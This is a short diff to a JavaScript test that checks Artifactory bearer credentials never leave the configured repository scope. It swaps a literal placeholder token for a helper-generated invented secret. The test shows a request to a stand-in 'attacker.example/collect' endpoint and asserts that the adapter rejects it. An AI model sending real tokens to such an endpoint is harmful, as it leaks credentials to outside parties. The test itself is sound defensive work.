@@ -17,6 +17,7 @@ import { verifyEpicTraceability } from '../src/epic-traceability.mjs';
 import { deriveInitiativeReport, initiativeNextActions } from '../src/initiative-report.mjs';
 import { createInitiative, loadInitiative, saveInitiative } from '../src/initiative-state.mjs';
 import { run } from '../src/util.mjs';
+import { invented } from './helpers/invented-secrets.mjs';
 
 process.env.NODE_ENV = 'test';
 process.env.SINGULARITY_FLOW_TEST_IDENTITY = 'Epic Product Owner';
@@ -114,7 +115,7 @@ test('Artifactory bearer credentials never leave the configured repository scope
     type: 'artifactory',
     baseUrl: 'https://artifacts.example.test/artifactory',
     repository: 'releases'
-  }, { token: 'do-not-leak', fetchImpl });
+  }, { token: invented('do-no', 't-leak'), fetchImpl });
 
   await assert.rejects(
     () => adapter.get({ url: 'https://attacker.example/collect' }, { maxBytes: 1024 }),
